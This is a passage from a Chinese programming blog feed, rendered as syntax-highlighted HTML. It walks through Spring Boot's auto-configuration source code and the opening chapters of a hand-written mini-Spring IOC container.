		configurations <span class="token operator">=</span> <span class="token function">removeDuplicates</span><span class="token punctuation">(</span>configurations<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> exclusions <span class="token operator">=</span> <span class="token function">getExclusions</span><span class="token punctuation">(</span>annotationMetadata<span class="token punctuation">,</span> attributes<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">checkExcludedClasses</span><span class="token punctuation">(</span>configurations<span class="token punctuation">,</span> exclusions<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 删除注解声明的不用的类信息</span>
		configurations<span class="token punctuation">.</span><span class="token function">removeAll</span><span class="token punctuation">(</span>exclusions<span class="token punctuation">)</span><span class="token punctuation">;</span>
  	<span class="token comment">// 关键！！！根据过滤规则，过滤不用的类信息</span>
		configurations <span class="token operator">=</span> <span class="token function">getConfigurationClassFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>configurations<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// 触发自动配置导入事件</span>
  	<span class="token function">fireAutoConfigurationImportEvents</span><span class="token punctuation">(</span>configurations<span class="token punctuation">,</span> exclusions<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">AutoConfigurationEntry</span><span class="token punctuation">(</span>configurations<span class="token punctuation">,</span> exclusions<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>




<span class="token keyword">protected</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">getCandidateConfigurations</span><span class="token punctuation">(</span><span class="token class-name">AnnotationMetadata</span> metadata<span class="token punctuation">,</span> <span class="token class-name">AnnotationAttributes</span> attributes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> configurations <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>
				<span class="token class-name">SpringFactoriesLoader</span><span class="token punctuation">.</span><span class="token function">loadFactoryNames</span><span class="token punctuation">(</span><span class="token function">getSpringFactoriesLoaderFactoryClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getBeanClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  	<span class="token comment">// 这里是关键，会找原先定义的所有Bean配置！！！</span>
		<span class="token class-name">ImportCandidates</span><span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token class-name">AutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token function">getBeanClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>configurations<span class="token operator">::</span><span class="token function">add</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> configurations<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>


<span class="token comment">// 获取注解类的全类名集合</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">ImportCandidates</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> annotation<span class="token punctuation">,</span> <span class="token class-name">ClassLoader</span> classLoader<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// LOCATION: "META-INF/spring/%s.imports"; 通过这个文件来找到所有自动配置类的信息</span>
  <span class="token comment">// annotation.getName() = org.springframework.boot.autoconfigure.AutoConfiguration</span>
  <span class="token comment">// 最终加载：META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports</span>
  <span class="token comment">// 这里直接下载源码，找Maven:org.springframework.boot:spring-boot-autoconfigure:2.7.5，一共有144个</span>
  <span class="token comment">// 里面的就是默认启动的一个项,比如：org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration，可以追一下源码</span>
		<span class="token class-name">String</span> location <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token constant">LOCATION</span><span class="token punctuation">,</span> annotation<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  	<span class="token comment">// 这里就读取到了所有的全类名集合</span>
		<span class="token class-name">Enumeration</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">></span></span> urls <span class="token operator">=</span> <span class="token function">findUrlsInClasspath</span><span class="token punctuation">(</span>classLoaderToUse<span class="token punctuation">,</span> location<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> autoConfigurations <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>urls<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token class-name">URL</span> url <span class="token operator">=</span> urls<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			autoConfigurations<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token function">readAutoConfigurations</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
    <span class="token comment">// 封装被返回</span>
		<span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ImportCandidates</span><span class="token punctuation">(</span>autoConfigurations<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>




<span class="token comment">// 这里就是过滤一部分不符合的类名</span>
<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> configurations<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">long</span> startTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> candidates <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">toStringArray</span><span class="token punctuation">(</span>configurations<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">boolean</span> skipped <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
      <span class="token comment">// 通过过滤器 原来加载配置文件有144个，如果是基础SpringBoot项目，就剩13个了</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">AutoConfigurationImportFilter</span> filter <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>filters<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">boolean</span><span class="token punctuation">[</span><span class="token punctuation">]</span> match <span class="token operator">=</span> filter<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>candidates<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>autoConfigurationMetadata<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> match<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>match<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
						candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
						skipped <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
					<span class="token punctuation">&#125;</span>
				<span class="token punctuation">&#125;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>skipped<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">return</span> configurations<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
  
  
<span class="token comment">// 这里我们以META-INF中Redis自动装配类来演示</span>
<span class="token number">1.</span> 查找 <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span></span>RedisAutoConfiguration</span>
<span class="token number">2.</span> 查看源码
<span class="token annotation punctuation">@AutoConfiguration</span>
<span class="token comment">// 这里就是判断你容器内有没有这个类数据</span>
<span class="token annotation punctuation">@ConditionalOnClass</span><span class="token punctuation">(</span><span class="token class-name">RedisOperations</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token comment">// 加载配置类，也就是我们在resource文件下写的内容，加载进来</span>
<span class="token annotation punctuation">@EnableConfigurationProperties</span><span class="token punctuation">(</span><span class="token class-name">RedisProperties</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token comment">// 导如 Lettuce  Jedis 这都是我们熟悉的工具</span>
<span class="token annotation punctuation">@Import</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token class-name">LettuceConnectionConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">JedisConnectionConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RedisAutoConfiguration</span> <span class="token punctuation">&#123;</span>

	<span class="token annotation punctuation">@Bean</span>
  <span class="token comment">// redisTemplate 工具</span>
	<span class="token annotation punctuation">@ConditionalOnMissingBean</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"redisTemplate"</span><span class="token punctuation">)</span>
	<span class="token annotation punctuation">@ConditionalOnSingleCandidate</span><span class="token punctuation">(</span><span class="token class-name">RedisConnectionFactory</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
	<span class="token keyword">public</span> <span class="token class-name">RedisTemplate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token function">redisTemplate</span><span class="token punctuation">(</span><span class="token class-name">RedisConnectionFactory</span> redisConnectionFactory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token class-name">RedisTemplate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> template <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedisTemplate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		template<span class="token punctuation">.</span><span class="token function">setConnectionFactory</span><span class="token punctuation">(</span>redisConnectionFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> template<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token annotation punctuation">@Bean</span>
  <span class="token comment">// StringRedisTemplate 工具</span>
	<span class="token annotation punctuation">@ConditionalOnMissingBean</span>
	<span class="token annotation punctuation">@ConditionalOnSingleCandidate</span><span class="token punctuation">(</span><span class="token class-name">RedisConnectionFactory</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
	<span class="token keyword">public</span> <span class="token class-name">StringRedisTemplate</span> <span class="token function">stringRedisTemplate</span><span class="token punctuation">(</span><span class="token class-name">RedisConnectionFactory</span> redisConnectionFactory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">StringRedisTemplate</span><span class="token punctuation">(</span>redisConnectionFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
<span class="token comment">// 核心点就是我们需要导入使用组件的核心位，比如我们使用Redis就要导入依赖</span>
org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>core
 
<span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span>
  <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>
  <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>spring<span class="token operator">-</span>boot<span class="token operator">-</span>starter<span class="token operator">-</span>data<span class="token operator">-</span>redis<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>自动装配</tag>
      </tags>
  </entry>
  <entry>
    <title>手写Spring系列：IOC</title>
    <url>//post/Spring/%E6%89%8B%E5%86%99Spring.html</url>
    <content><![CDATA[<h1 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h1><p>​    我们学Java的基本上都会使用Spring进行开发，而Spring中最为核心的又是IOC和AOP，接下来的内容是在学习<code>手写Spring渐进式源码实践</code>这本书后的学习总结，看是否我们能开发出一个<code>mini-Spring</code>。因为后期代码会很多，而且基本上都是在前一版的基础上进行扩展。这里我只声明每一章的目标扩展点是啥，具体从Github上获取源码：<a href="https://github.com/fuzhengwei/book-small-spring">https://github.com/fuzhengwei/book-small-spring</a></p>
<h2 id="第一章：实现一个简单的Spring-Bean容器"><a href="#第一章：实现一个简单的Spring-Bean容器" class="headerlink" title="第一章：实现一个简单的Spring Bean容器"></a>第一章：实现一个简单的Spring Bean容器</h2><p>​    先不深究Spring源码，我就看自己平时使用Spring时的体会，使用Spring时，通过XML配置文件或者通过注解，声明哪些类是需要注入到容器中的，到自己使用时，可以从容器中获取该类对象。那这不就是我们基础中学的Collection或者Map就能实现的操作嘛，因为我需要频繁的从容器中获取指定类对象，所以查询返回的效率需要非常高，那就我们就用Map来实现，先不要想那么多。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BeanFactory</span> <span class="token punctuation">&#123;</span>
		<span class="token comment">// 用Map来存储Bean</span>
    <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">BeanDefinition</span><span class="token punctuation">></span></span> beanDefinitionMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcurrentHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// 获取</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> beanDefinitionMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
		<span class="token comment">// 注册</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">registerBeanDefinition</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">BeanDefinition</span> beanDefinition<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        beanDefinitionMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> beanDefinition<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    这里我们使用BeanDefinition来包裹实际的对象，因为我们知道一个Bean不仅拥有自己属性，还拥有一些通用属性，比如：单例模式还是原型模式，Bean内需要填充的属性，这里我们只做包裹，其余的后面实现。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BeanDefinition</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 实际填充的对象</span>
    <span class="token keyword">private</span> <span class="token class-name">Object</span> bean<span class="token punctuation">;</span>
 		<span class="token comment">// 省略 构造器 和 get方法。。</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    我们来测试一下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test_BeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">// 1.初始化 BeanFactory</span>
    <span class="token class-name">BeanFactory</span> beanFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 2.注入bean</span>
    <span class="token class-name">BeanDefinition</span> beanDefinition <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanDefinition</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UserService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    beanFactory<span class="token punctuation">.</span><span class="token function">registerBeanDefinition</span><span class="token punctuation">(</span><span class="token string">"userService"</span><span class="token punctuation">,</span> beanDefinition<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 3.获取bean</span>
    <span class="token class-name">UserService</span> userService <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">UserService</span><span class="token punctuation">)</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"userService"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    userService<span class="token punctuation">.</span><span class="token function">queryUserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="第二章：实现Bean对象的定义，注册和获取"><a href="#第二章：实现Bean对象的定义，注册和获取" class="headerlink" title="第二章：实现Bean对象的定义，注册和获取"></a>第二章：实现Bean对象的定义，注册和获取</h2><p>​    在上面我们可以看到我是创建好了的<code>UserService</code>放入容器中，这和我们之前学的依赖倒置并不符合，我们应只指定哪些Bean需要加载到容器中，具体的对象实例应又BeanFactory自己管理，所以我们修改BeanDefinition，在内只存放Bean的Class对象。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BeanDefinition</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">Class</span> beanClass<span class="token punctuation">;</span>
  	<span class="token comment">// 构造器 get，set方法</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    BeanFactory也修改为接口，定义获取Bean的方式，具体Bean存储与获取交给子类来实现，使职责单一。</p>
<p>​    我们在这里先假设每个Bean都是单例的，创建SingletonBeanRegistry接口，定义注册和获取单例对象的方式，剩下的交给子类具体实现。</p>
<p>​    现在系统中有两个容器，一个是<code>BeanDefinitionMap</code>负责存储加载到容器的Bean信息，一个是<code>singletonObjects</code>负责存储已经创建好的单例对象。具体可看下面的UML类图，关系还是很清楚的。BeanFactory在实例化对象时，通过BeanDefinitionMap中的类信息，通过反射直接创建对象，并放入容器中。</p>
<blockquote>
<p>​    Spring中有大量的接口与抽象类，我个人感觉是将职责划分清楚，容易未来系统的扩展性，有一点是通过抽象类去实现接口，并定义自己的抽象方法，而且可以实现一部分的接口方法，这样既可以扩容接口，又能保证自己可以只实现自己职责内的方法。</p>
</blockquote>
<p><img src="../../typora-user-images/image-20221205195819447.png" alt="image-20221205195819447"></p>
<h2 id="第三章：基于Cglib实现含有构造函数的类实例化策略"><a href="#第三章：基于Cglib实现含有构造函数的类实例化策略" class="headerlink" title="第三章：基于Cglib实现含有构造函数的类实例化策略"></a>第三章：基于Cglib实现含有构造函数的类实例化策略</h2><p>​    在第二章中我们在<code>AbstractAutowireCapableBeanFactory::createBean</code>中通过反射进行Bean的实例化，这一章我们引入了实例化策略：<code>InstantiationStrategy</code>，并通过JDK和Cglib两个种方式去实现。</p>
<blockquote>
<p>JDK 和 Cglib实例化对象有什么区别</p>
</blockquote>
<p>​    CGLib创建的动态代理对象性能比JDK创建的动态代理对象的性能高不少，但是CGLib在创建代理对象时所花费的时间却比JDK多得多，所以对于单例的对象，因为无需频繁创建对象，用CGLib合适，反之，使用JDK方式要更为合适一些。同时，由于CGLib由于是采用动态创建子类的方法，对于final方法，无法进行代理。</p>
<p><img src="../../typora-user-images/image-20221205221303651.png" alt="image-20221205221303651"></p>
<h2 id="第四章：注入属性与依赖对象"><a href="#第四章：注入属性与依赖对象" class="headerlink" title="第四章：注入属性与依赖对象"></a>第四章：注入属性与依赖对象</h2><p><img src="../../typora-user-images/image-20221207124432765.png" alt="image-20221207124432765"></p>
<p>​    比方说我UserService内需要注入UserDao来操作数据库，所以我在实例化Bean后，应将所需的属性和依赖注入到Bean中，而这部分信息通过PropertyValues记录，并封装到BeanDefinition中。在实例化后应通过对应BeanDefinition获取到需要哪些内容，并进行填充处理。</p>
<p><img src="../../typora-user-images/image-20221205222330790.png" alt="image-20221205222330790"></p>
<h2 id="第五章：资源加载器解析文件注册对象"><a href="#第五章：资源加载器解析文件注册对象" class="headerlink" title="第五章：资源加载器解析文件注册对象"></a>第五章：资源加载器解析文件注册对象</h2><p><img src="../../typora-user-images/image-20221207131117901.png" alt="image-20221207131117901"></p>
<p>​    这里我们要加入XML解析，在上面我们都是手动将所有信息通过Java注册到BeanFactory的，这不利于维护，现实Spring中我们都是使用Xml进行配置或者注解开发，所以我们需要定义一个ResourceLoader去加载各种数据（XML文件，URL，Classpath）。</p>
<blockquote>
<p>资源加载，读取指定资源，转化为Resource，核心是获取文件的二进制流为后面解析</p>
</blockquote>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8t7dhdqsvj31v60imtdo.jpg" alt="image-20221205202349968"></p>
<blockquote>
<p>资源解析：利用XML解析器解析<code>Spring.xml</code>文件,获取所有Bean信息定义，并将其封装为BeanDefinition并注册</p>
</blockquote>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8t7l464y1j30bh0j9dhj.jpg" alt="image-20221205203109877"></p>
<blockquote>
<p>容器初始化：完成实例的实例化与属性填充</p>
</blockquote>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8tbqnpo66j327k0u07a6.jpg" alt="image-20221205225453703"></p>
<p>​    这一章类扩展的很多，建议仔细读两遍源码，着重关注资源加载解析部分即可，其余流程大体不变。</p>
<h2 id="第六章：实现应用上下文"><a href="#第六章：实现应用上下文" class="headerlink" title="第六章：实现应用上下文"></a>第六章：实现应用上下文</h2><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8v67e34i4j30sc0ingop.jpg" alt="image-20221207131430244"></p>
<blockquote>
<p>重点：</p>
</blockquote>
<p>引入应用上下文，进行资源扫描与加载，为Bean对象实例化过程添加扩展机制，允许加载Bean对象和在其实例化前后进行修改和扩展。</p>
<blockquote>
<p>核心：</p>
</blockquote>
<p>增加BeanPostProcessor 和 BeanFactoryPostProcessor </p>
<blockquote>
<p>有啥用：</p>
</blockquote>
<p>比如说我们想在Bean的实例化之前，对BeanDefinition做出记录或修改，影响Bean的实例化，或者在Bean的初始化方法前后进行一系列操作，这是后面章节的基础部分，实现容器感知，AOP等技术的实现</p>
<p><code>AbstractApplicationContext::refresh() 刷新容器</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 1. 创建 BeanFactory，并加载 BeanDefinition</span>
    <span class="token function">refreshBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 2. 获取 BeanFactory</span>
    <span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory <span class="token operator">=</span> <span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 3. 在 Bean 实例化之前，执行 BeanFactoryPostProcessor ，这时候Bean还没有实例化，找到所有的BeanFactoryPostProcessor，进行处理，可以修改BeanDefinition ！！！</span>
    <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 4. BeanPostProcessor 需要提前于其他 Bean 对象实例化之前执行注册操作，找到所有的BeanPostProcessor，添加到一个容器中，等对象实例化时进行处理  ！！！ </span>
    <span class="token function">registerBeanPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 5. 提前实例化单例Bean对象</span>
    beanFactory<span class="token punctuation">.</span><span class="token function">preInstantiateSingletons</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>加载出所有注册的BeanFactoryPostProcessor</code>，普通Bean实例化前操作</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span><span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
